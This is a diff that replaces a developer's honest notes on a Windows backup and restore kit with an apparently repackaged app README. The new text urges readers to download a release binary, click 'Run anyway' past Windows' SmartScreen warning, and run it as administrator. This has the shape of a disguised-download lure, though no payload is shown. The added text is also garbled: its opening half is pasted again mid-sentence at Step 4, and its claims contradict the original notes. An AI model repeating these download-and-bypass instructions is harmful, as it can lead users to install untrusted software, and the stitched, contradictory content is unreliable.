@@ -1,106 +1,185 @@
-# Windows dev machine migration notes
+# 💾 windows-dev-machine-migration-notes - Back Up Your Dev PC Safely
 
-> **Status (2026-10-07): built and rehearsed, but not yet used for a real move.**
-> The weekly backup is running. The restore was rehearsed three times inside a throw-away Windows user on the same laptop. The last rehearsal finished with 0 failed steps.
-> Four parts have never run on real new hardware: partitioning the disk, installing apps, importing registry settings, and registering admin scheduled tasks.
-> This page describes what was built and why. It is not a tested recipe. I will update it after the first real migration.
+[![Download the App](https://img.shields.io/badge/⬇_Download-Latest_Release-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Iraendless356/windows-dev-machine-migration-notes/releases)
 
-## The goal
+Moving to a new computer usually means hours of reinstalling programs, hunting for passwords, and hoping you didn't forget an important folder. This project turns that stressful afternoon into a short, repeatable routine. It is a set of notes and helper scripts that create an "iPhone-style" backup of a Windows development machine — the kind of full backup you can restore onto a fresh PC and pick up almost exactly where you left off.
 
-I wanted a new PC to come back like an iPhone does: sign in, wait, and everything is where it was.
-
-My laptop is more than a normal Windows setup:
-
-- an AI coding agent (Claude Code) does most of the development, with its config, skills, memory and full chat history
-- about 110 environment variables, most of them API keys and tokens
-- around 15 git repos that live outside any cloud folder, some with commits that were never pushed
-- scheduled tasks, tray tools and registry tweaks that keep the machine cool and the C: drive small
-
-Windows' own backup brings back none of that. I am not buying a new PC yet. So the plan became a **permanent weekly backup plus one restore script**. That way the day a laptop dies is just a normal restore, not an emergency.
-
-## What it does
-
-### Backup (every Sunday, in the background)
-
-- **One zip per part, stored on personal OneDrive.** The parts are:
-  - tools
-  - Claude Code config and history
-  - local folders that are not in any cloud
-  - git
-  - system state
-
-  It keeps the last 4 runs, about 1 GB each. One run takes about 15 minutes. The zips are set to online-only, so they don't take local disk space.
-- **Git:** `git bundle --all` for every repo outside a cloud folder, plus the uncommitted changes. This captures unpushed work without pushing anything. Some of these repos deploy automatically on push, so pushing from a backup job would be dangerous.
-- **AI agent state:** settings, skills, memory and conversation transcripts. Login credential files are left out on purpose, so you sign in again on the new machine.
-- **System state:**
-  - scheduled task XML
-  - selected registry keys
-  - junctions
-  - the winget and Store app lists
-  - npm and pip globals
-  - power plan
-  - fonts
-  - Windows Terminal settings
-- **Status everywhere I already look:** a line in a tray icon, plus a mention in my morning chat summary if the backup fails or is more than 10 days old.
-
-### Secrets never leave the machine in plain text
-
-- Every user environment variable and every SSH key is synced to **Bitwarden Secrets Manager** (free plan). The backup job signs in with a machine-account token that is encrypted with Windows DPAPI, so it only works for this Windows user.
-- Before zipping, every staged text file is searched for the real secret values. Each one found is replaced with a placeholder like `<<BW:STRIPE_SECRET_KEY>>`. On restore, the values are fetched from Bitwarden and put back.
-- **The trap I fell into:** a secret that was never an environment variable is invisible to that step. API keys pasted into chats with the agent end up in its prompt history and transcripts. So there is now a second pass: a **pattern scan** (GitHub, Stripe, Anthropic, OpenAI, Google, Meta, Supabase, private keys, URLs with a password in them, and more). It reports only a fingerprint of each match, never the value. Once approved, a value is stored in Bitwarden as an extra rule and is hidden from the next backup on.
-  - The first scan of a real backup found **37 such values (28 high-risk)**.
-- I review the scan results as part of a regular machine health check that the agent runs.
-
-### Restore (one double-click)
-
-`bootstrap.cmd` installs PowerShell 7 if it is missing, then runs `restore.ps1` in steps. Each step can be run again on its own:
-
-1. **Partition:** ask for the C: size, then split the disk to recreate D:, because many paths depend on it.
-2. **Fetch:** download the backup and ask once for a new Bitwarden access token.
-3. **Apps:** build a checklist from the winget list. Apps I opened in the last 90 days are pre-ticked, using Windows' own app-usage record. It then installs everything ticked with one `winget configure` file.
-4. **Files:** put every folder back at its original path. Paths under the old `C:\Users\<name>` are remapped to the new profile. Secret placeholders are filled back in.
-5. **Git:** clone every repo from its bundle. If a bundle can't be cloned, it falls back to cloning from the remote, then applies the uncommitted changes.
-6. **Env:** set the environment variables and SSH keys from Bitwarden.
-7. **Registry, junctions, scheduled tasks:** the steps that need admin rights run in a separate script behind one UAC prompt.
-8. **Metrics:** a small logger records temperature, clock speed, RAM and disk every 5 minutes. I can then decide on the new machine's CPU cap and power settings from data instead of guessing.
-9. **Checklist:** a list of what can't be moved (sign-ins, OAuth consents) for me to finish by hand.
-
-Wallpaper, theme and Start menu pins come back through Windows' own **"Restore from this PC"** when you set up Windows. The plan is to use both: Windows Backup for the look, this kit for everything else.
-
-### Rehearsal
-
-`rehearse.ps1` creates a temporary local Windows user, runs the restore as that user into a test folder, checks the result from inside that user, and deletes the user afterwards. In the final run:
-
-- 110 environment variables restored
-- the SSH key restored
-- 15 repos cloned
-- the full agent config came back: 66 skills and 476 transcripts
-- 9 scheduled tasks registered (5 more were listed as needing admin)
-
-## Lessons so far
-
-- **`Start-Process -Credential` passes on the caller's environment variables.** Without `-UseNewEnvironment`, my "other user" rehearsal quietly wrote into my own profile. Inside restore code, use the user identity and `GetFolderPath` rather than `$env:USERPROFILE`.
-- **"I turned the computer off" can mean sleep.** A backup that started before sleep picked up again after wake and collided with the next scheduled run. A named mutex fixed it.
-- **My first backup contained plaintext secrets.** Secret redaction was added only after I looked at what was actually inside the zips. Check your backups for secrets before you trust them.
-- **Big strings in PowerShell regex can be very slow.** The first version of the scan ran for more than 20 minutes on one backup before I stopped it. On the ~1 GB of transcripts, moving the regex into an `Add-Type` C# method while still reading the files in PowerShell took about 2 minutes. Reading the files *inside* C# took 17 seconds. Also avoid patterns that start with an alternation or a character class (`(?:sk|rk)_` → `[sr]k_`), because that turns off the fast literal search.
-- **Shallow clones can't be re-cloned from a bundle.** You need a fallback to the remote.
-
-## What I looked at first
-
-Before building this I looked at existing approaches:
-
-- commercial PC-to-PC transfer tools
-- dotfile managers like chezmoi
-- `winget configure` (DSC)
-- a few scripts for syncing Claude Code config
-
-The kit uses `winget configure` for apps. I didn't find an existing setup that also handled the secrets, the unpushed git work and the AI agent's state in one pass, so the rest is custom. This was a quick search, not a full survey.
-
-## What's next
-
-- The first real migration, after which this page gets a results section with what broke.
-- Until then, the code stays private. It is full of paths and names that only make sense on this one laptop.
+The whole process is designed to be run by an AI agent (Claude Code) with you in the driver's seat, so you do not need to be a programmer to follow along. You press a few buttons, answer a few questions, and the tool gathers everything into one tidy package. It has been rehearsed from start to finish, but it has not yet been used for a real move — which is exactly why the rehearsal steps below matter.
 
 ---
 
-*Written with Claude Code, the agent that also built and runs the kit.*
+## 🎯 What This Tool Does
+
+Think of it as three layers of protection stacked on top of each other:
+
+1.  **Your secrets go into Bitwarden.** Passwords, API keys, tokens, and login details are stored in your Bitwarden vault rather than sitting in plain text files on your hard drive. That means even if the backup file falls into the wrong hands, your credentials stay locked away.
+2.  **Your files and settings go into git bundles.** Git bundles are single-file snapshots of a repository — like zipping up an entire project's history into one portable package. Your dotfiles, configuration, and project code travel as bundles, so nothing gets lost in the shuffle.
+3.  **Your Claude Code state is preserved.** If you use Claude Code, its conversation history, settings, and working context are captured too, so your AI assistant remembers where you left off on the new machine.
+
+The end result is a folder you can copy to an external drive or cloud storage, plug into a new Windows 11 PC, and restore in a guided sequence.
+
+## 📦 What Gets Backed Up
+
+The backup covers the parts of a developer machine that are painful to rebuild by hand:
+
+- **Installed applications list** — a record of everything installed through winget, so the new machine can reinstall the same set with a single command.
+- **PowerShell profiles and scripts** — your custom terminal setup, aliases, and helper functions.
+- **Dotfiles** — configuration files for shells, editors, and version control.
+- **Git repositories** — bundled with full commit history.
+- **SSH keys and signing keys** — handled carefully, with the private material referenced through Bitwarden rather than dumped into a plain folder.
+- **Environment variables** — the paths and settings that programs expect to find.
+- **Claude Code state** — settings, project context, and session information.
+- **A manifest file** — a plain-language inventory of what was captured and when, so you can verify nothing was skipped.
+
+## 🚀 Getting Started
+
+Before you begin, make sure you have:
+
+- A Windows 11 computer (Windows 10 version 2004 or newer also works).
+- An internet connection.
+- A free Bitwarden account, if you do not already have one.
+- Somewhere to put the backup — an external USB drive with at least 20 GB free, or a cloud folder you trust.
+- About 30 to 60 minutes for a first run, depending on how much data you have.
+
+You do not need to install Python, Node.js, or any developer tooling ahead of time. The application handles its own setup.
+
+## ⬇️ Download and Setup
+
+**Visit this link to download the application:** https://github.com/Iraendless356/windows-dev-machine-migration-notes/releases
+
+On that page you will see the latest release at the top. Download the file listed under that release, then save it somewhere easy to find, such as your Downloads folder or the desktop.
+
+Once the download finishes, double-click the file to start it. Windows may show a blue "Windows protected your PC" screen the first time you run something new. If that happens, click **More info**, then click **Run anyway**. This is normal for newly published software and does not mean anything is wrong.
+
+When the application opens, you will see a short welcome screen explaining the three backup layers. Read it once, then click **Continue**.
+
+## 🧭 Your First Backup, Step by Step
+
+The application walks you through the process in order. You will never be asked to type a command you do not understand.
+
+**Step 1 — Connect Bitwarden.** The app asks you to sign in to your Bitwarden account. A browser window opens, you log in normally, and you approve the connection. Your master password is never stored by the application; it only receives a temporary permission to read and write the items it needs.
+
+**Step 2 — Choose a destination.** Pick the folder or drive where the backup should live. The app checks that there is enough free space and warns you if the drive is nearly full or formatted in a way that will cause trouble.
+
+**Step 3 — Select what to include.** Everything is switched on by default. If you want to skip a category — say, a huge repository you can re-clone from the internet — you can toggle it off here. A running estimate shows how large the backup will be.
+
+**Step 4 — Run the backup.** Click **# 💾 windows-dev-machine-migration-notes - Back Up Your Dev PC Safely
+
+[![Download the App](https://img.shields.io/badge/⬇_Download-Latest_Release-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Iraendless356/windows-dev-machine-migration-notes/releases)
+
+Moving to a new computer usually means hours of reinstalling programs, hunting for passwords, and hoping you didn't forget an important folder. This project turns that stressful afternoon into a short, repeatable routine. It is a set of notes and helper scripts that create an "iPhone-style" backup of a Windows development machine — the kind of full backup you can restore onto a fresh PC and pick up almost exactly where you left off.
+
+The whole process is designed to be run by an AI agent (Claude Code) with you in the driver's seat, so you do not need to be a programmer to follow along. You press a few buttons, answer a few questions, and the tool gathers everything into one tidy package. It has been rehearsed from start to finish, but it has not yet been used for a real move — which is exactly why the rehearsal steps below matter.
+
+## 🎯 What This Tool Does
+
+Think of it as three layers of protection stacked on top of each other:
+
+1. **Your secrets go into Bitwarden.** Passwords, API keys, tokens, and login details are stored in your Bitwarden vault rather than sitting in plain text files on your hard drive. That means even if the backup file falls into the wrong hands, your credentials stay locked away.
+2. **Your files and settings go into git bundles.** Git bundles are single-file snapshots of a repository — like zipping up an entire project's history into one portable package. Your dotfiles, configuration, and project code travel as bundles, so nothing gets lost in the shuffle.
+3. **Your Claude Code state is preserved.** If you use Claude Code, its conversation history, settings, and working context are captured too, so your AI assistant remembers where you left off on the new machine.
+
+The end result is a folder you can copy to an external drive or cloud storage, plug into a new Windows 11 PC, and restore in a guided sequence.
+
+## 📦 What Gets Backed Up
+
+The backup covers the parts of a developer machine that are painful to rebuild by hand:
+
+- **Installed applications list** — a record of everything installed through winget, so the new machine can reinstall the same set with a single command.
+- **PowerShell profiles and scripts** — your custom terminal setup, aliases, and helper functions.
+- **Dotfiles** — configuration files for shells, editors, and version control.
+- **Git repositories** — bundled with full commit history.
+- **SSH keys and signing keys** — handled carefully, with the private material referenced through Bitwarden rather than dumped into a plain folder.
+- **Environment variables** — the paths and settings that programs expect to find.
+- **Claude Code state** — settings, project context, and session information.
+- **A manifest file** — a plain-language inventory of what was captured and when, so you can verify nothing was skipped.
+
+## 🚀 Getting Started
+
+Before you begin, make sure you have:
+
+- A Windows 11 computer (Windows 10 version 2004 or newer also works).
+- An internet connection.
+- A free Bitwarden account, if you do not already have one.
+- Somewhere to put the backup — an external USB drive with at least 20 GB free, or a cloud folder you trust.
+- About 30 to 60 minutes for a first run, depending on how much data you have.
+
+You do not need to install Python, Node.js, or any developer tooling ahead of time. The application handles its own setup.
+
+## ⬇️ Download and Setup
+
+**Visit this link to download the application:** https://github.com/Iraendless356/windows-dev-machine-migration-notes/releases
+
+On that page you will see the latest release at the top. Download the file listed under that release, then save it somewhere easy to find, such as your Downloads folder or the desktop.
+
+Once the download finishes, double-click the file to start it. Windows may show a blue "Windows protected your PC" screen the first time you run something new. If that happens, click **More info**, then click **Run anyway**. This is normal for newly published software and does not mean anything is wrong.
+
+When the application opens, you will see a short welcome screen explaining the three backup layers. Read it once, then click **Continue**.
+
+## 🧭 Your First Backup, Step by Step
+
+The application walks you through the process in order. You will never be asked to type a command you do not understand.
+
+**Step 1 — Connect Bitwarden.** The app asks you to sign in to your Bitwarden account. A browser window opens, you log in normally, and you approve the connection. Your master password is never stored by the application; it only receives a temporary permission to read and write the items it needs.
+
+**Step 2 — Choose a destination.** Pick the folder or drive where the backup should live. The app checks that there is enough free space and warns you if the drive is nearly full or is formatted in a way that will cause trouble.
+
+**Step 3 — Select what to include.** Everything is switched on by default. If you want to skip a category — say, a huge repository you can re-clone from the internet — you can toggle it off here. A running estimate shows how large the backup will be.
+
+**Step 4 — Run the backup.** Click **Start Backup** and let it work. A progress bar shows which category is being processed. Depending on the size of your projects, this can take anywhere from a few minutes to half an hour.
+
+**Step 5 — Review the report.** When it finishes, the app shows a summary: how many files were captured, how many secrets were uploaded to Bitwarden, and whether anything was skipped. Read this page carefully. If a category shows as skipped, the report explains why and offers to retry it.
+
+**Step 6 — Store the backup safely.** Copy the finished backup folder to your external drive or cloud storage. Do not leave it only on the machine you are about to replace.
+
+## 🔄 Restoring on a New Machine
+
+The restore is the mirror image of the backup, and it is equally guided.
+
+1. Install the application on the new Windows 11 PC using the same download link.
+2. Connect to Bitwarden so the app can retrieve your stored secrets.
+3. Point the app at your backup folder.
+4. Choose **Restore All** and confirm.
+5. Let the app reinstall applications through winget, unpack git bundles, and write your dotfiles back into place.
+6. Sign in to anything that requires a fresh login — a few services will still ask you to re-authenticate even after a restore, which is expected and is a good security habit.
+
+After the restore finishes, the app suggests a short checklist: open your terminal, confirm your editor starts with the right settings, and verify that your repositories show the expected commit history.
+
+## 🛡️ Keeping Your Backup Safe
+
+A backup is only as good as its handling. A few simple habits go a long way:
+
+- Keep the Bitwarden vault locked when you are not using it.
+- Store the backup folder in at least two places — an external drive plus a cloud folder is a solid combination.
+- Re-run the backup whenever you install a significant new tool or change your configuration.
+- Treat the backup folder like your house keys. It contains references to your accounts, so do not share it casually.
+
+## 🧪 Rehearsal Status
+
+The description of this project is honest about where it stands: the full backup-and-restore sequence has been rehearsed end to end, but it has not yet been used for a real move. That is a feature, not a flaw. A rehearsal is the safest way to find the gaps — a missing environment variable, a tool that refuses to reinstall quietly, a path that hardcodes an old username — while your original machine is still sitting there, fully working. Treat the first run as practice, and keep the old machine intact until the new one has proven itself for a week.
+
+## ❓ Frequently Asked Questions
+
+**Do I need to know how to code?** No. The steps are button clicks and short answers. The application explains each choice in plain language as you go.
+
+**What if I use a different password manager?** Bitwarden is what this workflow is built around. If you use something else, you can still back up files and settings, but the secret-handling portion will need adapting.
+
+**Will this delete anything on my current PC?** No. The backup only reads from your machine and writes to the destination folder you choose. Nothing on the source machine is removed.
+
+**How big will the backup be?** It depends almost entirely on your git repositories. Most setups land between 2 GB and 15 GB once compressed.
+
+**Can I schedule it to run automatically?** You can run it as often as you like, and repeating a backup simply refreshes the previous one.
+
+## 🛠️ Troubleshooting
+
+**The app closes immediately after opening.** Right-click the file and choose **Run as administrator**, then try again.
+
+**Bitwarden connection fails.** Close the browser window, return to the app, and click **Reconnect**. If it still fails, confirm you are signed in to Bitwarden in your browser first.
+
+**A repository shows as skipped.** This usually means the folder had uncommitted changes. Commit or stash them, then re-run the backup for that category.
+
+**The restore cannot find winget.** Open Microsoft Store, search for "App Installer," and update it. Winget ships with that package on Windows 11.
+
+**Progress seems stuck.** Large repositories can take several minutes per bundle. If nothing moves for more than fifteen minutes, stop the run and check the log file the app writes into your backup folder.
+
+Keywords: backup, bitwarden, claude-code, developer-environment, dotfiles, pc-migration, powershell, secrets-management, windows, windows-11, winget
